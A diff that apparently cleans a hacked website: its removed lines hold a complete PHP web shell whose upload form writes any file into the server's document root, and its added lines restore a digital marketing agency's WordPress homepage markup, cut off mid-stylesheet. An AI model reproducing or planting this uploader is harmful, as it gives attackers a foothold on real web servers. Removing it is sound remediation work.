@@ -1,47 +1,1502 @@
-<!DOCTYPE HTML>
-<html lang="en-US">
-<head>
-	<meta charset="UTF-8">
-</head>
-<body>
-<script>
-    </script>
-</style>
 
-<body>
+<!DOCTYPE html>
+<html lang="id-ID">
+<head><meta charset="UTF-8" /><script>if(navigator.userAgent.match(/MSIE|Internet Explorer/i)||navigator.userAgent.match(/Trident\/7\..*?rv:11/i)){var href=document.location.href;if(!href.match(/[?&]nowprocket/)){if(href.indexOf("?")==-1){if(href.indexOf("#")==-1){document.location.href=href+"?nowprocket=1"}else{document.location.href=href.replace("#","?nowprocket=1#")}}else{if(href.indexOf("#")==-1){document.location.href=href+"&nowprocket=1"}else{document.location.href=href.replace("#","&nowprocket=1#")}}}}</script><script>class RocketLazyLoadScripts{constructor(){this.v="1.2.5.1",this.triggerEvents=["keydown","mousedown","mousemove","touchmove","touchstart","touchend","wheel"],this.userEventHandler=this._triggerListener.bind(this),this.touchStartHandler=this._onTouchStart.bind(this),this.touchMoveHandler=this._onTouchMove.bind(this),this.touchEndHandler=this._onTouchEnd.bind(this),this.clickHandler=this._onClick.bind(this),this.interceptedClicks=[],this.interceptedClickListeners=[],this._interceptClickListeners(this),window.addEventListener("pageshow",e=>{this.persisted=e.persisted,this.everythingLoaded&&this._triggerLastFunctions()}),document.addEventListener("DOMContentLoaded",()=>{this._preconnect3rdParties()}),this.delayedScripts={normal:[],async:[],defer:[]},this.trash=[],this.allJQueries=[]}_addUserInteractionListener(e){if(document.hidden){e._triggerListener();return}this.triggerEvents.forEach(t=>window.addEventListener(t,e.userEventHandler,{passive:!0})),window.addEventListener("touchstart",e.touchStartHandler,{passive:!0}),window.addEventListener("mousedown",e.touchStartHandler),document.addEventListener("visibilitychange",e.userEventHandler)}_removeUserInteractionListener(){this.triggerEvents.forEach(e=>window.removeEventListener(e,this.userEventHandler,{passive:!0})),document.removeEventListener("visibilitychange",this.userEventHandler)}_onTouchStart(e){"HTML"!==e.target.tagName&&(window.addEventListener("touchend",this.touchEndHandler),window.addEventListener("mouseup",this.touchEndHandler),window.addEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.addEventListener("mousemove",this.touchMoveHandler),e.target.addEventListener("click",this.clickHandler),this._disableOtherEventListeners(e.target,!0),this._renameDOMAttribute(e.target,"onclick","rocket-onclick"),this._pendingClickStarted())}_onTouchMove(e){window.removeEventListener("touchend",this.touchEndHandler),window.removeEventListener("mouseup",this.touchEndHandler),window.removeEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.removeEventListener("mousemove",this.touchMoveHandler),e.target.removeEventListener("click",this.clickHandler),this._disableOtherEventListeners(e.target,!1),this._renameDOMAttribute(e.target,"rocket-onclick","onclick"),this._pendingClickFinished()}_onTouchEnd(){window.removeEventListener("touchend",this.touchEndHandler),window.removeEventListener("mouseup",this.touchEndHandler),window.removeEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.removeEventListener("mousemove",this.touchMoveHandler)}_onClick(e){e.target.removeEventListener("click",this.clickHandler),this._disableOtherEventListeners(e.target,!1),this._renameDOMAttribute(e.target,"rocket-onclick","onclick"),this.interceptedClicks.push(e),e.preventDefault(),e.stopPropagation(),e.stopImmediatePropagation(),this._pendingClickFinished()}_replayClicks(){window.removeEventListener("touchstart",this.touchStartHandler,{passive:!0}),window.removeEventListener("mousedown",this.touchStartHandler),this.interceptedClicks.forEach(e=>{e.target.dispatchEvent(new MouseEvent("click",{view:e.view,bubbles:!0,cancelable:!0}))})}_interceptClickListeners(e){EventTarget.prototype.addEventListenerBase=EventTarget.prototype.addEventListener,EventTarget.prototype.addEventListener=function(t,i,r){"click"!==t||e.windowLoaded||i===e.clickHandler||e.interceptedClickListeners.push({target:this,func:i,options:r}),(this||window).addEventListenerBase(t,i,r)}}_disableOtherEventListeners(e,t){this.interceptedClickListeners.forEach(i=>{i.target===e&&(t?e.removeEventListener("click",i.func,i.options):e.addEventListener("click",i.func,i.options))}),e.parentNode!==document.documentElement&&this._disableOtherEventListeners(e.parentNode,t)}_waitForPendingClicks(){return new Promise(e=>{this._isClickPending?this._pendingClickFinished=e:e()})}_pendingClickStarted(){this._isClickPending=!0}_pendingClickFinished(){this._isClickPending=!1}_renameDOMAttribute(e,t,i){e.hasAttribute&&e.hasAttribute(t)&&(event.target.setAttribute(i,event.target.getAttribute(t)),event.target.removeAttribute(t))}_triggerListener(){this._removeUserInteractionListener(this),"loading"===document.readyState?document.addEventListener("DOMContentLoaded",this._loadEverythingNow.bind(this)):this._loadEverythingNow()}_preconnect3rdParties(){let e=[];document.querySelectorAll("script[type=rocketlazyloadscript][data-rocket-src]").forEach(t=>{let i=t.getAttribute("data-rocket-src");if(i&&0!==i.indexOf("data:")){0===i.indexOf("//")&&(i=location.protocol+i);try{let r=new URL(i).origin;r!==location.origin&&e.push({src:r,crossOrigin:t.crossOrigin||"module"===t.getAttribute("data-rocket-type")})}catch(n){}}}),e=[...new Map(e.map(e=>[JSON.stringify(e),e])).values()],this._batchInjectResourceHints(e,"preconnect")}async _loadEverythingNow(){this.lastBreath=Date.now(),this._delayEventListeners(this),this._delayJQueryReady(this),this._handleDocumentWrite(),this._registerAllDelayedScripts(),this._preloadAllScripts(),await this._loadScriptsFromList(this.delayedScripts.normal),await this._loadScriptsFromList(this.delayedScripts.defer),await this._loadScriptsFromList(this.delayedScripts.async);try{await this._triggerDOMContentLoaded(),await this._pendingWebpackRequests(this),await this._triggerWindowLoad()}catch(e){console.error(e)}window.dispatchEvent(new Event("rocket-allScriptsLoaded")),this.everythingLoaded=!0,this._waitForPendingClicks().then(()=>{this._replayClicks()}),this._emptyTrash()}_registerAllDelayedScripts(){document.querySelectorAll("script[type=rocketlazyloadscript]").forEach(e=>{e.hasAttribute("data-rocket-src")?e.hasAttribute("async")&&!1!==e.async?this.delayedScripts.async.push(e):e.hasAttribute("defer")&&!1!==e.defer||"module"===e.getAttribute("data-rocket-type")?this.delayedScripts.defer.push(e):this.delayedScripts.normal.push(e):this.delayedScripts.normal.push(e)})}async _transformScript(e){if(await this._littleBreath(),!0===e.noModule&&"noModule"in HTMLScriptElement.prototype){e.setAttribute("data-rocket-status","skipped");return}return new Promise(t=>{let i;function r(){(i||e).setAttribute("data-rocket-status","executed"),t()}try{if(navigator.userAgent.indexOf("Firefox/")>0||""===navigator.vendor)i=document.createElement("script"),[...e.attributes].forEach(e=>{let t=e.nodeName;"type"!==t&&("data-rocket-type"===t&&(t="type"),"data-rocket-src"===t&&(t="src"),i.setAttribute(t,e.nodeValue))}),e.text&&(i.text=e.text),i.hasAttribute("src")?(i.addEventListener("load",r),i.addEventListener("error",function(){i.setAttribute("data-rocket-status","failed"),t()}),setTimeout(()=>{i.isConnected||t()},1)):(i.text=e.text,r()),e.parentNode.replaceChild(i,e);else{let n=e.getAttribute("data-rocket-type"),s=e.getAttribute("data-rocket-src");n?(e.type=n,e.removeAttribute("data-rocket-type")):e.removeAttribute("type"),e.addEventListener("load",r),e.addEventListener("error",function(){e.setAttribute("data-rocket-status","failed"),t()}),s?(e.removeAttribute("data-rocket-src"),e.src=s):e.src="data:text/javascript;base64,"+window.btoa(unescape(encodeURIComponent(e.text)))}}catch(a){e.setAttribute("data-rocket-status","failed"),t()}})}async _loadScriptsFromList(e){let t=e.shift();return t&&t.isConnected?(await this._transformScript(t),this._loadScriptsFromList(e)):Promise.resolve()}_preloadAllScripts(){this._batchInjectResourceHints([...this.delayedScripts.normal,...this.delayedScripts.defer,...this.delayedScripts.async],"preload")}_batchInjectResourceHints(e,t){var i=document.createDocumentFragment();e.forEach(e=>{let r=e.getAttribute&&e.getAttribute("data-rocket-src")||e.src;if(r){let n=document.createElement("link");n.href=r,n.rel=t,"preconnect"!==t&&(n.as="script"),e.getAttribute&&"module"===e.getAttribute("data-rocket-type")&&(n.crossOrigin=!0),e.crossOrigin&&(n.crossOrigin=e.crossOrigin),e.integrity&&(n.integrity=e.integrity),i.appendChild(n),this.trash.push(n)}}),document.head.appendChild(i)}_delayEventListeners(e){let t={};function i(i,r){return t[r].eventsToRewrite.indexOf(i)>=0&&!e.everythingLoaded?"rocket-"+i:i}function r(e,r){var n;!t[n=e]&&(t[n]={originalFunctions:{add:n.addEventListener,remove:n.removeEventListener},eventsToRewrite:[]},n.addEventListener=function(){arguments[0]=i(arguments[0],n),t[n].originalFunctions.add.apply(n,arguments)},n.removeEventListener=function(){arguments[0]=i(arguments[0],n),t[n].originalFunctions.remove.apply(n,arguments)}),t[e].eventsToRewrite.push(r)}function n(t,i){let r=t[i];t[i]=null,Object.defineProperty(t,i,{get:()=>r||function(){},set(n){e.everythingLoaded?r=n:t["rocket"+i]=r=n}})}r(document,"DOMContentLoaded"),r(window,"DOMContentLoaded"),r(window,"load"),r(window,"pageshow"),r(document,"readystatechange"),n(document,"onreadystatechange"),n(window,"onload"),n(window,"onpageshow")}_delayJQueryReady(e){let t;function i(t){return e.everythingLoaded?t:t.split(" ").map(e=>"load"===e||0===e.indexOf("load.")?"rocket-jquery-load":e).join(" ")}function r(r){if(r&&r.fn&&!e.allJQueries.includes(r)){r.fn.ready=r.fn.init.prototype.ready=function(t){return e.domReadyFired?t.bind(document)(r):document.addEventListener("rocket-DOMContentLoaded",()=>t.bind(document)(r)),r([])};let n=r.fn.on;r.fn.on=r.fn.init.prototype.on=function(){return this[0]===window&&("string"==typeof arguments[0]||arguments[0]instanceof String?arguments[0]=i(arguments[0]):"object"==typeof arguments[0]&&Object.keys(arguments[0]).forEach(e=>{let t=arguments[0][e];delete arguments[0][e],arguments[0][i(e)]=t})),n.apply(this,arguments),this},e.allJQueries.push(r)}t=r}r(window.jQuery),Object.defineProperty(window,"jQuery",{get:()=>t,set(e){r(e)}})}async _pendingWebpackRequests(e){let t=document.querySelector("script[data-webpack]");async function i(){return new Promise(e=>{t.addEventListener("load",e),t.addEventListener("error",e)})}t&&(await i(),await e._requestAnimFrame(),await e._pendingWebpackRequests(e))}async _triggerDOMContentLoaded(){this.domReadyFired=!0,await this._littleBreath(),document.dispatchEvent(new Event("rocket-readystatechange")),await this._littleBreath(),document.rocketonreadystatechange&&document.rocketonreadystatechange(),await this._littleBreath(),document.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this._littleBreath(),window.dispatchEvent(new Event("rocket-DOMContentLoaded"))}async _triggerWindowLoad(){await this._littleBreath(),document.dispatchEvent(new Event("rocket-readystatechange")),await this._littleBreath(),document.rocketonreadystatechange&&document.rocketonreadystatechange(),await this._littleBreath(),window.dispatchEvent(new Event("rocket-load")),await this._littleBreath(),window.rocketonload&&window.rocketonload(),await this._littleBreath(),this.allJQueries.forEach(e=>e(window).trigger("rocket-jquery-load")),await this._littleBreath();let e=new Event("rocket-pageshow");e.persisted=this.persisted,window.dispatchEvent(e),await this._littleBreath(),window.rocketonpageshow&&window.rocketonpageshow({persisted:this.persisted}),this.windowLoaded=!0}_triggerLastFunctions(){document.onreadystatechange&&document.onreadystatechange(),window.onload&&window.onload(),window.onpageshow&&window.onpageshow({persisted:this.persisted})}_handleDocumentWrite(){let e=new Map;document.write=document.writeln=function(t){let i=document.currentScript;i||console.error("WPRocket unable to document.write this: "+t);let r=document.createRange(),n=i.parentElement,s=e.get(i);void 0===s&&(s=i.nextSibling,e.set(i,s));let a=document.createDocumentFragment();r.setStart(a,0),a.appendChild(r.createContextualFragment(t)),n.insertBefore(a,s)}}async _littleBreath(){Date.now()-this.lastBreath>45&&(await this._requestAnimFrame(),this.lastBreath=Date.now())}async _requestAnimFrame(){return document.hidden?new Promise(e=>setTimeout(e)):new Promise(e=>requestAnimationFrame(e))}_emptyTrash(){this.trash.forEach(e=>e.remove())}static run(){let e=new RocketLazyLoadScripts;e._addUserInteractionListener(e)}}RocketLazyLoadScripts.run();</script>
+	
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link rel="pingback" href="https://dotnextdigital.com/xmlrpc.php" />
 
-<center>
-<font color='Black' size="5px">Hi Sempai (ᗒᗩᗕ) </font><br>
-<?php
-echo '<big><span style="color: black;">Directory: <span style="color: gray;">'.getcwd().'</span></big><br><br>';
-echo "<form method='post' enctype='multipart/form-data'>
-	  <input type='file' name='just_file'>
-	  <input type='submit' name='upload' value='Upload!'>
-	  </form>
-	  </center>";
-$root = $_SERVER['DOCUMENT_ROOT'];
-$files = $_FILES['just_file']['name'];
-$dest = $root.'/'.$files;
-if(isset($_POST['upload'])) {
-	if(is_writable($root)) {
-		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
-			$web = "http://".$_SERVER['HTTP_HOST']."/";
-			echo "<font color='lime'sukses upload -> <center><a href='$web$files' target='_blank'><b><u>$web/$files</u></b></a></center>";
-		} else {
-			echo "<font color='red'gagal upload di document root.";
-		}
-	} else {
-		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
-			echo " upload <b>$files</b> di folder ini";
-		} else {
-			echo "gagal upload";
-		}
-	}
+	<script type="rocketlazyloadscript" data-rocket-type="text/javascript">
+		document.documentElement.className = 'js';
+	</script>
+
+	    <style>
+        #wpadminbar #wp-admin-bar-p404_free_top_button .ab-icon:before {
+            content: "\f103";
+            color:red;
+            top: 2px;
+        }
+    </style>
+    <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<link rel="alternate" href="https://dotnextdigital.com/" hreflang="id" />
+<link rel="alternate" href="https://dotnextdigital.com/en/" hreflang="en" />
+
+	<!-- This site is optimized with the Yoast SEO plugin v23.9 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Digital Marketing Agency Jakarta | DOTNEXT Digital</title>
+	<meta name="description" content="Dengan Digital marketing agency jakarta, tingkatkan kesuksesan bisnis Anda bersama kami dengan menentukan target yang potensial untuk bisnis" />
+	<link rel="canonical" href="https://dotnextdigital.com/" />
+	<meta property="og:locale" content="id_ID" />
+	<meta property="og:locale:alternate" content="en_US" />
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="Digital Marketing Agency Jakarta | DOTNEXT Digital" />
+	<meta property="og:description" content="Dengan Digital marketing agency jakarta, tingkatkan kesuksesan bisnis Anda bersama kami dengan menentukan target yang potensial untuk bisnis" />
+	<meta property="og:url" content="https://dotnextdigital.com/" />
+	<meta property="og:site_name" content="DOTNEXT DIGITAL" />
+	<meta property="article:publisher" content="https://www.facebook.com/dotnextdigital/" />
+	<meta property="article:modified_time" content="2024-09-06T15:31:51+00:00" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://dotnextdigital.com/#article","isPartOf":{"@id":"https://dotnextdigital.com/"},"author":{"name":"Admin_Dotnext","@id":"https://dotnextdigital.com/#/schema/person/c854958a120c6cb117ff5cc6fea35a7b"},"headline":"Digital Marketing Agency Jakarta","datePublished":"2024-01-16T20:09:35+00:00","dateModified":"2024-09-06T15:31:51+00:00","mainEntityOfPage":{"@id":"https://dotnextdigital.com/"},"wordCount":5070,"publisher":{"@id":"https://dotnextdigital.com/#organization"},"image":{"@id":"https://dotnextdigital.com/#primaryimage"},"thumbnailUrl":"https://dotnextdigital.com/wp-content/uploads/2020/03/dotnext_digital.jpg","inLanguage":"id"},{"@type":"WebPage","@id":"https://dotnextdigital.com/","url":"https://dotnextdigital.com/","name":"Digital Marketing Agency Jakarta | DOTNEXT Digital","isPartOf":{"@id":"https://dotnextdigital.com/#website"},"about":{"@id":"https://dotnextdigital.com/#organization"},"primaryImageOfPage":{"@id":"https://dotnextdigital.com/#primaryimage"},"image":{"@id":"https://dotnextdigital.com/#primaryimage"},"thumbnailUrl":"https://dotnextdigital.com/wp-content/uploads/2020/03/dotnext_digital.jpg","datePublished":"2024-01-16T20:09:35+00:00","dateModified":"2024-09-06T15:31:51+00:00","description":"Dengan Digital marketing agency jakarta, tingkatkan kesuksesan bisnis Anda bersama kami dengan menentukan target yang potensial untuk bisnis","breadcrumb":{"@id":"https://dotnextdigital.com/#breadcrumb"},"inLanguage":"id","potentialAction":[{"@type":"ReadAction","target":["https://dotnextdigital.com/"]}]},{"@type":"ImageObject","inLanguage":"id","@id":"https://dotnextdigital.com/#primaryimage","url":"https://dotnextdigital.com/wp-content/uploads/2020/03/dotnext_digital.jpg","contentUrl":"https://dotnextdigital.com/wp-content/uploads/2020/03/dotnext_digital.jpg","width":720,"height":405,"caption":"digital marketing agency jakarta"},{"@type":"BreadcrumbList","@id":"https://dotnextdigital.com/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home"}]},{"@type":"WebSite","@id":"https://dotnextdigital.com/#website","url":"https://dotnextdigital.com/","name":"DOTNEXT DIGITAL","description":"Digital Marketing Agency Jakarta","publisher":{"@id":"https://dotnextdigital.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://dotnextdigital.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"id"},{"@type":"Organization","@id":"https://dotnextdigital.com/#organization","name":"DOTNEXT DIGITAL","url":"https://dotnextdigital.com/","logo":{"@type":"ImageObject","inLanguage":"id","@id":"https://dotnextdigital.com/#/schema/logo/image/","url":"https://dotnextdigital.com/wp-content/uploads/2020/03/dotnext_digital.jpg","contentUrl":"https://dotnextdigital.com/wp-content/uploads/2020/03/dotnext_digital.jpg","width":720,"height":405,"caption":"DOTNEXT DIGITAL"},"image":{"@id":"https://dotnextdigital.com/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/dotnextdigital/","https://www.instagram.com/dotnextdigital/"]},{"@type":"Person","@id":"https://dotnextdigital.com/#/schema/person/c854958a120c6cb117ff5cc6fea35a7b","name":"Admin_Dotnext","image":{"@type":"ImageObject","inLanguage":"id","@id":"https://dotnextdigital.com/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/dad98d3bf987a9b42750e82a283378dd?s=96&r=g","contentUrl":"https://secure.gravatar.com/avatar/dad98d3bf987a9b42750e82a283378dd?s=96&r=g","caption":"Admin_Dotnext"},"url":"https://dotnextdigital.com/author/admin_dotnext/"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//cdn.jsdelivr.net' />
+<link rel='dns-prefetch' href='//www.googletagmanager.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel="alternate" type="application/rss+xml" title="DOTNEXT DIGITAL &raquo; Feed" href="https://dotnextdigital.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="DOTNEXT DIGITAL &raquo; Umpan Komentar" href="https://dotnextdigital.com/comments/feed/" />
+<meta content="Divi v.4.27.1" name="generator"/><link data-minify="1" rel='stylesheet' id='ht_ctc_main_css-css' href='https://dotnextdigital.com/wp-content/cache/min/1/wp-content/plugins/click-to-chat-for-whatsapp/new/inc/assets/css/main.css?ver=1732600824' type='text/css' media='all' />
+<style id='wp-block-library-theme-inline-css' type='text/css'>
+.wp-block-audio :where(figcaption){
+  color:#555;
+  font-size:13px;
+  text-align:center;
 }
-?>
-</body>
-<br>
-<br>
-<br>
+.is-dark-theme .wp-block-audio :where(figcaption){
+  color:#ffffffa6;
+}
+
+.wp-block-audio{
+  margin:0 0 1em;
+}
+
+.wp-block-code{
+  border:1px solid #ccc;
+  border-radius:4px;
+  font-family:Menlo,Consolas,monaco,monospace;
+  padding:.8em 1em;
+}
+
+.wp-block-embed :where(figcaption){
+  color:#555;
+  font-size:13px;
+  text-align:center;
+}
+.is-dark-theme .wp-block-embed :where(figcaption){
+  color:#ffffffa6;
+}
+
+.wp-block-embed{
+  margin:0 0 1em;
+}
+
+.blocks-gallery-caption{
+  color:#555;
+  font-size:13px;
+  text-align:center;
+}
+.is-dark-theme .blocks-gallery-caption{
+  color:#ffffffa6;
+}
+
+:root :where(.wp-block-image figcaption){
+  color:#555;
+  font-size:13px;
+  text-align:center;
+}
+.is-dark-theme :root :where(.wp-block-image figcaption){
+  color:#ffffffa6;
+}
+
+.wp-block-image{
+  margin:0 0 1em;
+}
+
+.wp-block-pullquote{
+  border-bottom:4px solid;
+  border-top:4px solid;
+  color:currentColor;
+  margin-bottom:1.75em;
+}
+.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{
+  color:currentColor;
+  font-size:.8125em;
+  font-style:normal;
+  text-transform:uppercase;
+}
+
+.wp-block-quote{
+  border-left:.25em solid;
+  margin:0 0 1.75em;
+  padding-left:1em;
+}
+.wp-block-quote cite,.wp-block-quote footer{
+  color:currentColor;
+  font-size:.8125em;
+  font-style:normal;
+  position:relative;
+}
+.wp-block-quote:where(.has-text-align-right){
+  border-left:none;
+  border-right:.25em solid;
+  padding-left:0;
+  padding-right:1em;
+}
+.wp-block-quote:where(.has-text-align-center){
+  border:none;
+  padding-left:0;
+}
+.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote:where(.is-style-plain){
+  border:none;
+}
+
+.wp-block-search .wp-block-search__label{
+  font-weight:700;
+}
+
+.wp-block-search__button{
+  border:1px solid #ccc;
+  padding:.375em .625em;
+}
+
+:where(.wp-block-group.has-background){
+  padding:1.25em 2.375em;
+}
+
+.wp-block-separator.has-css-opacity{
+  opacity:.4;
+}
+
+.wp-block-separator{
+  border:none;
+  border-bottom:2px solid;
+  margin-left:auto;
+  margin-right:auto;
+}
+.wp-block-separator.has-alpha-channel-opacity{
+  opacity:1;
+}
+.wp-block-separator:not(.is-style-wide):not(.is-style-dots){
+  width:100px;
+}
+.wp-block-separator.has-background:not(.is-style-dots){
+  border-bottom:none;
+  height:1px;
+}
+.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){
+  height:2px;
+}
+
+.wp-block-table{
+  margin:0 0 1em;
+}
+.wp-block-table td,.wp-block-table th{
+  word-break:normal;
+}
+.wp-block-table :where(figcaption){
+  color:#555;
+  font-size:13px;
+  text-align:center;
+}
+.is-dark-theme .wp-block-table :where(figcaption){
+  color:#ffffffa6;
+}
+
+.wp-block-video :where(figcaption){
+  color:#555;
+  font-size:13px;
+  text-align:center;
+}
+.is-dark-theme .wp-block-video :where(figcaption){
+  color:#ffffffa6;
+}
+
+.wp-block-video{
+  margin:0 0 1em;
+}
+
+:root :where(.wp-block-template-part.has-background){
+  margin-bottom:0;
+  margin-top:0;
+  padding:1.25em 2.375em;
+}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:root { --wp--style--global--content-size: 823px;--wp--style--global--wide-size: 1080px; }:where(body) { margin: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}.is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;line-height: inherit;padding: calc(0.667em + 2px) calc(1.333em + 2px);text-decoration: none;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: 